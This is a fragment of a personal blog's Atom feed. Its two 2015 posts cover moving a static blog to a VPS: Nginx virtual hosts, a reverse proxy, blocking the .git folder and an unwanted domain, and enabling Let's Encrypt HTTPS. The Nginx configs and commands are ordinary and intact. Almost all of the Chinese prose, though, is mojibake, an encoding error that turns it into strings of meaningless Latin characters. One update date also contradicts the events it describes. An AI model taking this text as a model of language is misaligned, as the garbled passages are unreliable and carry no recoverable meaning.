      <category term="ä¸ƒç‰›" scheme="//blog.stdioa.com/tags/%E4%B8%83%E7%89%9B/"/>
    
      <category term="git" scheme="//blog.stdioa.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢è¿ç§»è®°ï¼ˆäºŒï¼‰</title>
    <link href="//blog.stdioa.com/2015/12/blog-migration-ii/"/>
    <id>//blog.stdioa.com/2015/12/blog-migration-ii/</id>
    <published>2015-12-18T07:55:37.000Z</published>
    <updated>2016-11-08T13:48:35.437Z</updated>
    
    <content type="html"><![CDATA[<p>åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&gt;_&lt;
åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚</p>
<a id="more"></a>
<h1 id="1-nginxhost">1. ä½¿ç”¨Nginxé’ˆå¯¹å¤šä¸ªhostéƒ¨ç½²æœåŠ¡å™¨</h1>
<h2 id="11">1.1 æ¦‚è¿°</h2>
<p>å¦‚æœä¸€ä¸ªVPSåªèƒ½æ­ä¸€ä¸ªç½‘ç«™ï¼Œé‚£æœªå…å¤ªæµªè´¹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®Nginxçš„æ–¹å¼æ¥å°†é’ˆå¯¹å¤šä¸ªåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ï¼Œä»è€Œè¿›è¡Œä¸åŒçš„å¤„ç†ã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨DNSé…ç½®æ—¶å°†<code>blog.stdioa.com</code>ä¸<code>crypt.stdioa.com</code>åŒæ—¶æŒ‡å‘åˆ°æˆ‘çš„è…¾è®¯äº‘çš„IPåœ°å€ï¼Œç”¨æˆ·è®¿é—®è¿™ä¸¤ä¸ªåŸŸåæ—¶ï¼Œéƒ½ä¼šå‘æˆ‘çš„VPSå‘é€è¯·æ±‚ï¼Œæˆ‘è¦åšçš„æ˜¯å°†è¿™ä¸¤ç§é’ˆå¯¹ä¸åŒåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ã€‚è€Œè¿™ä¸¤ç§è¯·æ±‚çš„åŒºåˆ«åœ¨HTTPè¯·æ±‚å¤´çš„Hostå­—æ®µï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦é’ˆå¯¹ä¸åŒçš„Hostä½¿ç”¨ä¸åŒçš„å¤„ç†æ–¹å¼å³å¯ã€‚</p>
<h2 id="12">1.2 æ“ä½œ</h2>
<p>æˆ‘çš„VPSä¸Šæ’˜æœ‰ä¸¤ä¸ªç½‘ç«™ï¼Œå…¶ä¸­<code>blog.stdioa.com</code>åŸŸåæŒ‡å‘çš„æ˜¯æˆ‘çš„åšå®¢â€”â€”ä¸€ä¸ªé™æ€æœåŠ¡å™¨ï¼Œè€Œ<code>crypt</code>åŸŸåæŒ‡å‘çš„æ˜¯ä¸€ä¸ªä½¿ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¦åœ¨Nginxç«¯è¿›è¡Œåå‘ä»£ç†ï¼Œå°†è¯·æ±‚è½¬å‘åˆ°æœ¬åœ°çš„5000ç«¯å£ã€‚
å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="section">server</span> &#123;</div><div class="line">     <span class="attribute">listen</span>       <span class="number">80</span>;</div><div class="line">     <span class="attribute">server_name</span>  stdioa.com blog.stdioa.com;       <span class="comment"># é€šå¾€åšå®¢çš„è¯·æ±‚ç›´æ¥é€šè¿‡æ–‡ä»¶æœåŠ¡å™¨è¿”å›</span></div><div class="line"></div><div class="line">     <span class="attribute">access_log</span>  /var/log/nginx/access_blog.log;</div><div class="line">     <span class="attribute">error_log</span> /var/log/nginx/error_blog.log;</div><div class="line"></div><div class="line">     <span class="attribute">root</span>   /home/stdio/blog;</div><div class="line">     <span class="attribute">index</span>  index index.html;</div><div class="line"></div><div class="line">     <span class="attribute">location</span> / &#123;</div><div class="line">     &#125;</div><div class="line">     <span class="attribute">location</span><span class="regexp"> ^~</span> /.git &#123;                            <span class="comment"># ç¦æ­¢è®¿é—®.gitæ–‡ä»¶å¤¹</span></div><div class="line">         <span class="attribute">deny</span> all;</div><div class="line">     &#125;</div><div class="line">     <span class="attribute">error_page</span>  <span class="number">404</span>     /<span class="number">404</span>.html;</div><div class="line">&#125;</div><div class="line"><span class="section">server</span> &#123;</div><div class="line">     <span class="attribute">listen</span> <span class="number">80</span>;</div><div class="line">     <span class="attribute">server_name</span> crypt.stdioa.com;                  <span class="comment"># hostä¸ºcryptçš„è¯·æ±‚è½¬å‘æœ¬åœ°ç«¯å£</span></div><div class="line"></div><div class="line">     <span class="attribute">access_log</span> /var/log/nginx/access_crypt.log;</div><div class="line">     <span class="attribute">error_log</span> /var/log/nginx/error_crypt.log;</div><div class="line"></div><div class="line">     <span class="attribute">location</span> / &#123;</div><div class="line">         <span class="attribute">proxy_pass</span> http://127.0.0.1:5000/;</div><div class="line">     &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, å¯ä»¥çœ‹åˆ°è®¿é—®ä¸åŒåŸŸåæ—¶ï¼Œè¯·æ±‚ä¼šäº¤ç»™ä¸åŒçš„ç¨‹åºå¤„ç†ã€‚</p>
<h1 id="2">2. å±è”½æ¥è‡ªç‰¹å®šåŸŸåçš„è¯·æ±‚</h1>
<h2 id="21">2.1 èƒŒæ™¯</h2>
<p>ç½‘ç«™éƒ¨ç½²å¥½åï¼Œåˆå‘ç°äº†ä¸€ä¸ªæ¥è‡ªå¥‡æ€ªåŸŸåçš„è¯·æ±‚ï¼›æ›´å‘çˆ¹çš„æ˜¯ï¼Œè¿™ä¸ªåŸŸåæŒ‡å‘è‡ªå·±çš„VPSï¼›æ›´æ›´å‘çˆ¹çš„æ˜¯ï¼Œæ¥è‡ªè¿™ä¸ªåŸŸåçš„è¯·æ±‚æœ‰å¥½å¤šï¼Œç›´æ¥æŠŠæˆ‘çš„æ—¥å¿—åˆ·çˆ†äº†â€¦æ‰€ä»¥æˆ‘éœ€è¦å°†æ¥è‡ªè¿™ä¸ªåŸŸåçš„æ‰€æœ‰è¯·æ±‚æ‹’ç»æ‰ã€‚</p>
<h2 id="22">2.2 æ“ä½œ</h2>
<p>æ–°å»ºä¸€ä¸ªServerå°±å¥½å•¦ã€‚å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">server</span> &#123;</div><div class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</div><div class="line">    <span class="attribute">server_name</span> bailigo.com <span class="regexp">*.bailigo.com</span>;</div><div class="line">    <span class="attribute">location</span> / &#123;</div><div class="line">        <span class="attribute">return</span> <span class="number">410</span>;         <span class="comment"># 410 Gone, ä½¿ç”¨äº†è¿™ä¸ªçŠ¶æ€ç ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½ä¸å†è®©çˆ¬è™«çˆ¬è¿™ä¸ªç½‘é¡µ</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆï¼Œé‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ï¼ŒæˆåŠŸã€‚
<em>æœ¬æ¥æƒ³ç”¨418, ä½†æ˜¯Nginxæ²¡æœ‰418çš„è¿”å›é¡µé¢ï¼Œæƒ³äº†æƒ³è¿˜æ˜¯ç®—äº†å§</em></p>
<h1 id="3-https">3. ä¸ºåšå®¢éƒ¨ç½²HTTPSæœåŠ¡å™¨</h1>
<h2 id="31">3.1 èƒŒæ™¯</h2>
<p><code>blog.stdioa.com</code>åšå®¢ä¸Šåˆè¿˜å¯ä»¥è®¿é—®ï¼Œä¸­åˆåƒé¡¿é¥­å°±å‘ç°è®¿é—®è¢«æˆªæ–­äº†ï¼ŒåŸå› ä¸ä»¥å‰ä¸€æ ·â€”â€”åŸŸåæœªå®Œæˆå¤‡æ¡ˆã€‚ç»æŸ¥çœ‹ï¼Œè…¾è®¯å¯¹è®¿é—®åšå®¢çš„è¯·æ±‚è¿›è¡Œäº†301è·³è½¬ï¼Œäºæ˜¯æƒ³äº†æƒ³ï¼Œç»™åšå®¢é…ç½®äº†HTTPS, è®©ä½ ä»¬å†é˜»æ–­â†’_â†’ï¼ˆå¥½å§å†é˜»æ–­çš„è¯æˆ‘çœŸçš„ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº†</p>
<h2 id="32-lets-encrypt">3.2 ä½¿ç”¨Letâ€™s Encryptç”Ÿæˆç½‘ç«™è¯ä¹¦</h2>
<p>ä¹‹å‰å°±çœ‹ä¸­äº†<a href="https://letsencrypt.org/" target="_blank" rel="external">Letâ€™s Encrypt</a>ï¼Œå®ƒæä¾›ä¸»æµæµè§ˆå™¨è®¤è¯çš„å…è´¹è¯ä¹¦ï¼Œåªå¯æƒœå½“æ—¶æ²¡æœ‰åŸŸåæ— æ³•ä½“éªŒã€‚ç°åœ¨æœ‰äº†åŸŸåï¼ŒåŠ ä¸Šè…¾è®¯å¯¹æœªå¤‡æ¡ˆçš„åŸŸåæŸ¥çš„å¾ˆç´§ï¼Œæ‰€æœ‰æœªå¤‡æ¡ˆåŸŸåä¸‹çš„ç½‘ç«™æ­èµ·æ¥åŠå¤©å°±è¢«å°æ‰ï¼Œæƒ³äº†æƒ³ï¼Œè¿˜æ˜¯ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œé…ä¸ªHTTPSæ’‘ä¸€é˜µå­å§â•®(â•¯_â•°)â•­
æŒ‰ç…§å®˜æ–¹çš„<a href="https://community.letsencrypt.org/t/quick-start-guide/1631" target="_blank" rel="external">æŒ‡å—</a>ä»¥åŠ<a href="http://www.vpser.net/build/letsencrypt-free-ssl.html" target="_blank" rel="external">æ­¤æŒ‡å—</a>åœ¨å°†<a href="https://github.com/letsencrypt/letsencrypt" target="_blank" rel="external">Letâ€™s Encryptçš„Repo</a> cloneåˆ°æœ¬åœ°ä¹‹åï¼Œè¾“å…¥<code>./letsencrypt-auto certonly --email é‚®ç®± -d åŸŸå --agree-tos</code>æ¥ç”Ÿæˆè¯ä¹¦ã€‚ç”±äºè…¾è®¯äº‘åˆ°Letâ€™s Encryptçš„æœåŠ¡å™¨çš„é“¾æ¥æå…¶ä¸ç¨³å®šï¼Œé€šå¸¸éœ€è¦é‡è¯•å¾ˆå¤šæ¬¡æ‰èƒ½æ­£å¸¸è·ŸLetâ€™s Encryptçš„æœåŠ¡å™¨é€šä¿¡ã€‚æˆåŠŸåä¼šæ˜¾ç¤ºï¼š</p>
<blockquote>
<p>IMPORTANT NOTES:
- Congratulations! Your certificate and chain have been saved at
/etc/letsencrypt/live/blog.stdioa.com/fullchain.pem. Your cert
will expire on 2016-03-17. To obtain a new version of the
certificate in the future, simply run Letâ€™s Encrypt again.
- If you like Letâ€™s Encrypt, please consider supporting our work by:</p>
<p>Donating to ISRG / Letâ€™s Encrypt:   <a href="https://letsencrypt.org/donate" target="_blank" rel="external">https://letsencrypt.org/donate</a>
Donating to EFF:                    <a href="https://eff.org/donate-le" target="_blank" rel="external">https://eff.org/donate-le</a></p>
</blockquote>
<p>è¯ä¹¦å·²å­˜å‚¨åœ¨ä¸Šé¢ä¿¡æ¯æŒ‡ç¤ºçš„ç›®å½•ã€‚</p>
<h2 id="33-nginx-https">3.3 é…ç½®Nginx, æ­å»ºHTTPSæœåŠ¡å™¨</h2>
<p>è¯ä¹¦å·²ç”Ÿæˆï¼Œä¸‹é¢è¯¥é…ç½®Nginxäº†ï¼Œæ·»åŠ ä¸‹åˆ—é…ç½®ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="section">server</span> &#123;</div><div class="line">    <span class="attribute">listen</span>  <span class="number">443</span> ssl;</div><div class="line">    <span class="attribute">server_name</span>  blog.stdioa.com;</div><div class="line"></div><div class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/blog.stdioa.com/fullchain.pem;        <span class="comment"># æ·»åŠ è¯ä¹¦</span></div><div class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/blog.stdioa.com/privkey.pem;      <span class="comment"># æ·»åŠ å¯†é’¥</span></div><div class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH"</span>;</div><div class="line">    <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</div><div class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</div><div class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">10m</span>;</div><div class="line"></div><div class="line">    <span class="comment"># åé¢å’Œæ™®é€šæœåŠ¡å™¨ä¸€æ ·</span></div><div class="line">    <span class="attribute">access_log</span>  /var/log/nginx/access_blog.log;</div><div class="line">    <span class="attribute">error_log</span> /var/log/nginx/error_blog.log;</div><div class="line"></div><div class="line">    <span class="attribute">root</span>   /home/stdio/blog;</div><div class="line">    <span class="attribute">index</span>  index index.html;</div><div class="line"></div><div class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /.git &#123;</div><div class="line">        <span class="attribute">deny</span> all;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="attribute">error_page</span>  <span class="number">404</span> /<span class="number">404</span>.html;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é‡æ–°åŠ è½½é…ç½®ï¼Œè®¿é—®<a href="https://blog.stdioa.com" target="_blank" rel="external">https://blog.stdioa.com</a> , æˆåŠŸ~</p>
<p>å°æ’æ›²ï¼š
æ˜¨å¤©æ™šä¸Šç†„ç¯ä¹‹å‰å‘ç°Ubuntuä¸Šä½¿ç”¨<code>apt-get</code>å®‰è£…çš„Nginxç‰ˆæœ¬å¤ªè€äº†ï¼Œäºæ˜¯åœ¨VPSä¸Šé‡æ–°ç¼–è¯‘å‡çº§äº†Nginxï¼Œç»“æœé…ç½®å¥½HTTPSä»¥åé‡å¯Nginxæ—¶å‘ç°å¯åŠ¨å¤±è´¥ï¼ŒåŸå› ä¸ºç¼ºå°‘<code>ngx</code>ç»„ä»¶ã€‚ç»Googleåå‘ç°æ²¡æœ‰ç¼–è¯‘è¯¥ç»„ä»¶ï¼Œæ‰€ä»¥é‡æ–°ç¼–è¯‘å®‰è£…Nginx, åœ¨é…ç½®æ—¶åŠ å…¥<code>--with-http_ssl_module</code>é€‰é¡¹ã€‚</p>
<p>å°æ’æ›²2ï¼š
HTTPSé…ç½®å¥½åè®¿é—®åšå®¢ï¼ŒChromeæç¤ºâ€œå­˜åœ¨ä¸å®‰å…¨çš„å†…å®¹â€ï¼Œé€‰æ‹©åŠ è½½åï¼Œåœ°å€æ å·¦è¾¹çš„HTTPSä¼šå˜æˆçº¢è‰²ï¼Œæå…¶ä¸å¥½çœ‹ï¼ˆé›¾ï¼‰ï¼Œäºæ˜¯çœ‹äº†åšå®¢çš„æ¨¡æ¿ï¼Œå‘ç°æœ‰ä¸¤ä¸ªjsåœ¨åŠ è½½æ—¶é€‰æ‹©ä½¿ç”¨HTTPæ–¹å¼åŠ è½½ï¼Œäºæ˜¯å°†<code>http://.../*.js</code>æ”¹ä¸º<code>//.../*.js</code>, ä½¿æµè§ˆå™¨å¯ä»¥æ ¹æ®å½“å‰åè®®è‡ªåŠ¨é€‰æ‹©JSæ–‡ä»¶çš„åŠ è½½åè®®ã€‚æ›´æ–°åšå®¢æ¨¡æ¿ï¼Œé‡æ–°è®¿é—®ï¼Œæ‰€æœ‰jså‡ä½¿ç”¨HTTPSæ–¹å¼åŠ è½½ï¼Œé—®é¢˜è§£å†³ã€‚é™„å›¾:</p>
<center>![å“ˆå“ˆå“ˆHTTPS](/pics/hhh_HTTPS.jpg)</center>
<p>å°æ’æ›²3ï¼š
ä¸Šé¢é‚£å¼ å›¾ç‰‡çš„é“¾æ¥ä¹‹å‰æ¥è‡ªä¸ƒç‰›ï¼Œé‡‡ç”¨HTTPåè®®è€Œä¸æ˜¯HTTPSåŠ è½½ã€‚å‘å¸ƒè¿™ç¯‡åšæ–‡åï¼Œæˆ‘å‘ç°è¯¥æ–‡ç« é¡µé¢ä¸­åœ°å€æ å·¦ä¾§çš„HTTPSæ ‡å¿—å˜ä¸ºäº†ç™½è‰²â€¦è¿˜æ˜¯ä¸å¥½çœ‹ï¼æ‰“å¼€Chromeçš„æ§åˆ¶å°ï¼Œåœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°ï¼Œå¦‚æœå›¾ç‰‡é“¾æ¥åè®®ä¸ºHTTPSï¼Œåˆ™Chromeä¾ç„¶ä¼šæç¤ºâ€œä¸å®‰å…¨â€ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰è¿™åªæ˜¯ä¸€å¼ å›¾ç‰‡è€Œå·²å•Šï¼Œåˆä¸æ˜¯JS_(:Ğ·ã‚âˆ )_
è§£å†³æ–¹æ¡ˆï¼šå°†å›¾ç‰‡é“¾æ¥æ”¹å›æœ¬åœ°ï¼Œå¾…åŸŸåå¤‡æ¡ˆåå†æƒ³åŠæ³•åœ¨ä¸ƒç‰›é‚£è¾¹è§£å†³åŸŸåç»‘å®šåŠHTTPSçš„é—®é¢˜ã€‚</p>
<h1 id="4">4. å‚è€ƒèµ„æ–™</h1>
<p><a href="http://www.vpser.net/build/letsencrypt-free-ssl.html" target="_blank" rel="external">å…è´¹SSLå®‰å…¨è¯ä¹¦Letâ€™s Encryptå®‰è£…ä½¿ç”¨æ•™ç¨‹(é™„Nginx/Apacheé…ç½®)</a>
<a href="http://blog.csdn.net/donghustone/article/details/25797727" target="_blank" rel="external">http://blog.csdn.net/donghustone/article/details/25797727</a>
<a href="http://serverfault.com/questions/438889/nginx-ssl-error" target="_blank" rel="external">nginx SSL error - Server Fault</a>
<a href="http://www.zzidc.com/main/help/showHelpContent/id_473.html" target="_blank" rel="external">ç½‘ç«™å­˜åœ¨ä¸å®‰å…¨å› ç´ çš„è§£å†³åŠæ³•</a></p>
<h1 id="5">5. åè®°</h1>
<p>å¿«é€’å·²å‘å‡ºï¼Œç›¸ç‰‡å·²å®¡æ ¸æˆåŠŸï¼Œè…¾è®¯æ”¶åˆ°èµ„æ–™ä¹‹åä¼šå°½å¿«æŠ¥ç®¡å±€å®¡ç†â€¦å¸Œæœ›2016å¹´ä¹‹å‰èƒ½å¤Ÿå¤‡æ¡ˆæˆåŠŸQvQ
å—¯ï¼ŒGoogleçœŸå¥½ç”¨
<strong>è¯´å¥½çš„å‡†å¤‡è€ƒè¯•å‘¢ï¼</strong></p>
<hr>
<p><strong>Update @ 16:38</strong>
ä¸Šåˆæ‰æŠŠèµ„æ–™ç”¨å¿«é€’å‘èµ°ï¼Œä¸‹åˆè…¾è®¯äº‘å°±è¯´æˆ‘çš„çº¸è´¨èµ„æ–™å·²æ”¶åˆ°â€¦æ‰“ç”µè¯é—®äº†ä¸€ä¸‹ï¼Œå®¢æœè¯´è…¾è®¯ä¸ºäº†åŠ å¿«å®¡æ ¸é€Ÿåº¦ï¼Œå¸®æˆ‘å‡†å¤‡äº†ä¸€ä»½ææ–™ä¸Šäº¤ç®¡å±€ï¼Œä¼°è®¡ä»–ä»¬æ˜¯ç”¨æˆ‘çš„æ‰«æä»¶æ‰“å°äº†ä¸€ä»½äº¤ä¸Šå»äº†å§ï¼Œä¹Ÿæ˜¯ä¸é”™2333 æœ€åå¸Œæœ›é€šä¿¡äº¤é€šç®¡ç†å±€å¿«ä¸€ç‚¹_(:Ğ·ã‚âˆ )_</p>
<hr>
<p><strong>Update @ 19:59, Dec. 24th, 2015</strong>
è…¾è®¯äº‘è®¿é—®Githubçš„é€Ÿåº¦å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†åšå®¢çš„Repoè¿ç§»åˆ°äº†Codingä¸Šã€‚</p>
<ol>
<li>å»ºç«‹ç§æœ‰é¡¹ç›®</li>
<li>è®¾ç½®éƒ¨ç½²å…¬é’¥
å› ä¸ºæ˜¯ç§æœ‰é¡¹ç›®æ‰€ä»¥æ— æ³•é€šè¿‡ä¸€ä¸ª__ä¸å«ç”¨æˆ·åå¯†ç __çš„é“¾æ¥è®¿é—®Repoæ¥è¿›è¡ŒPullï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡SSHè®¿é—®æ¯”è¾ƒèˆ’æœä¸€äº›ã€‚</li>
<li>æ”¹æ‰VPSä¸Šçš„originé“¾æ¥ï¼Œå®Œæˆ</li>
</ol>
<p>æ›¾ç»å¬åˆ°è¿‡ä¸€ç§è¯´æ³•ï¼šç”¨HTTPSè®¿é—®Git Repoè¦æ¯”SSHæ›´å¥½ï¼Œç„¶è€Œä¸€ç›´ä¸çŸ¥é“å¥½åœ¨å“ªâ€¦è®°å¾—ç”¨HTTPSè®¿é—®Repoçš„æ—¶å€™è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯è¦é™„åœ¨é“¾æ¥é‡Œé¢çš„ï¼Œæ„Ÿè§‰å¥½ä¸å®‰å…¨
åŸŸåå¤‡æ¡ˆçœ‹æ¥çœŸçš„è¦å¥”ç€20å¤©çš„æ ·å­å»äº†â€¦</p>
<p><strong>Update @ 11:07, Jan. 5th, 2015</strong>
åŸŸåå¤‡æ¡ˆåœ¨2016å¹´çš„ç¬¬ä¸€ä¸ªå·¥ä½œæ—¥é€šè¿‡å•¦ï¼åº†ç¥ä¸€ä¸‹ï¼ŒæœŸæœ«ä¹‹åå¼€å§‹å‡†å¤‡åˆ¶ä½œä¸ªäººç½‘ç«™~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&amp;gt;_&amp;lt;
åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ä¹±ä¸ƒå…«ç³Ÿ" scheme="//blog.stdioa.com/categories/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Github" scheme="//blog.stdioa.com/tags/Github/"/>
    
      <category term="nginx" scheme="//blog.stdioa.com/tags/nginx/"/>
    
      <category term="Let&#39;s Encrypt" scheme="//blog.stdioa.com/tags/Let-s-Encrypt/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢è¿ç§»è®°ï¼ˆä¸€ï¼‰</title>
    <link href="//blog.stdioa.com/2015/12/blog-migration/"/>
    <id>//blog.stdioa.com/2015/12/blog-migration/</id>
    <published>2015-12-17T11:55:37.000Z</published>
    <updated>2016-11-08T13:48:35.455Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚</p>
<a id="more"></a>
<h1 id="1">1. èƒŒæ™¯ä»‹ç»</h1>
<p>é¦–å…ˆæ‰“ä¸ªå¹¿å‘Šï¼šå€ŸåŠ©â€œè…¾è®¯äº‘+æ ¡å›­â€è®¡åˆ’ï¼Œæˆ‘æˆåŠŸåœ°ç”¨ä¸Šäº†1å…ƒ/æœˆçš„æœåŠ¡å™¨å’Œ11å…ƒ/æœˆçš„.comåŸŸåã€‚
æœ‰äº†å›½å†…è®¿é—®é€Ÿåº¦æå¿«çš„VPSï¼Œæœ‰äº†åŸŸåï¼Œå°±æƒ³è‡ªå·±é¼“æ£é¼“æ£ï¼ŒæŠŠè‡ªå·±çš„åšå®¢å’Œå…¶ä»–ç«™ç‚¹æ‰˜ç®¡åˆ°VPSä¸Šã€‚</p>
<h1 id="2">2. åšå®¢æ‰˜ç®¡</h1>
<h2 id="21">2.1 æ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨</h2>
<p>å› ä¸ºè‡ªå·±çš„åšå®¢æ˜¯é™æ€åšå®¢ï¼Œä¹‹å‰æ‰˜ç®¡åœ¨<a href="https://github.com/StdioA/stdioa.github.io" target="_blank" rel="external">Github</a>ä¸Šï¼Œä¾é Github Pageså®ç°éƒ¨ç½²ï¼Œæ‰€ä»¥æˆ‘å…ˆå°†æ–‡ä»¶cloneäº†ä¸‹æ¥ï¼Œå­˜æ”¾åœ¨<code>~/blog</code>ç›®å½•ä¸­ã€‚
ä¸‹é¢è¦åšçš„ï¼Œæ˜¯æ­å»ºä¸€ä¸ªé™æ€æœåŠ¡å™¨ã€‚</p>
<h3 id="211-pythonsimplehttpserver">2.1.1 ä½¿ç”¨Pythonçš„SimpleHTTPServer</h3>
<p>Pythonçš„SimpleHTTPServeræ˜¯ä¸€ä¸ªéå¸¸å®ç”¨ã€æ–¹ä¾¿çš„åº“ï¼Œå¯ä»¥ä½¿ç”¨ç®€å•ä¸€æ¡å‘½ä»¤åœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªHTTPæ–‡ä»¶æœåŠ¡å™¨ã€‚æ‰€ä»¥è¾“å…¥<code>sudo python -m SimpleHTTPServer 80</code>å‘½ä»¤ï¼Œå³å¯æ­å»ºä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå®ç°ä»å¤–ç½‘å¯¹é™æ€åšå®¢çš„ç›´æ¥è®¿é—®ã€‚
ç„¶è€Œæ­å»ºå¥½åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºæˆ‘çš„blogæ–‡ä»¶å¤¹æœ¬èº«æ˜¯ä¸€ä¸ªGit Repo, æ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥ä»å¤–ç½‘è®¿é—®.gitæ–‡ä»¶å¤¹ï¼Œè™½ç„¶æˆ‘çš„.gitç›®å½•æ²¡æœ‰ä¿å­˜ä»»ä½•è®¾ç½®åŠè´¦æˆ·ç­‰ï¼Œä½†è¿™æ ·ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç¦æ­¢å¤–éƒ¨ç”¨æˆ·å¯¹.gitæ–‡ä»¶å¤¹çš„è®¿é—®ã€‚</p>
<h3 id="212-nginx">2.1.2 ä½¿ç”¨Nginxæ‰˜ç®¡æ–‡ä»¶æœåŠ¡å™¨</h3>
<p>å…³äºNginxçš„ä»‹ç»ï¼Œè¯·è‡ªè¡Œè®¿é—®<a href="http://nginx.org/" target="_blank" rel="external">å®˜ç½‘</a>ä¸<a href="https://en.wikipedia.org/wiki/Nginx" target="_blank" rel="external">ç»´åŸºç™¾ç§‘</a>ã€‚
ä¹‹å‰ç”¨è¿‡Apache, ä½†æ˜¯åœ¨æ¥è§¦Nginxåï¼Œæˆ‘è®¤ä¸ºæˆ‘å¯¹Nginxæ›´æœ‰å¥½æ„Ÿï¼Œæ‰€ä»¥é‡‡ç”¨äº†Nginxåšä¸ºæ–‡ä»¶æ‰˜ç®¡æœåŠ¡å™¨ã€‚
é¦–å…ˆå®‰è£…Nginxï¼Œåˆ æ‰<code>/etc/nginx/sites-enabled</code>ç›®å½•ï¼ˆæˆ‘çš„ç³»ç»Ÿæ˜¯Ubuntu Server 14.04 LTSï¼‰ï¼Œåœ¨<code>conf.d</code>ç›®å½•ä¸­è®¾ç½®é…ç½®æ–‡ä»¶ï¼š</p>
